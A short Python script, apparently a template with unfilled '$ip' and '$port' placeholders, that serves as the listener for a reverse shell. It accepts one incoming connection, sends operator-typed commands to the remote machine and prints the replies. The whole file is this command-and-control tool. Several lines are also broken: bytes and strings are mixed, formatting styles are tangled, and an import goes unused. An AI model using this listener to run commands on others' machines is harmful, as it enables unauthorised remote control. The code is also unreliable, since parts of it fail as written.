import socket
import	subprocess as sp,sys


HOST = '$ip'
PORT = $port

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen()
print(f"[+] Listen on IP : %s , PORT %d" %(HOST,PORT))

client, address = server.accept()

while True:

	print(f"[+] - Connected to {address}")
	cmd_input = input(" [+] enter a command #> ")
	if cmd_input != "exit()":

		client.send(cmd_input.encode('utf-8'))
		result = client.recv(1024)
		print(result.rstrip("\n"))
	else:
		client.send("exit()")
		print("[+] close connection")
		break

server.close()
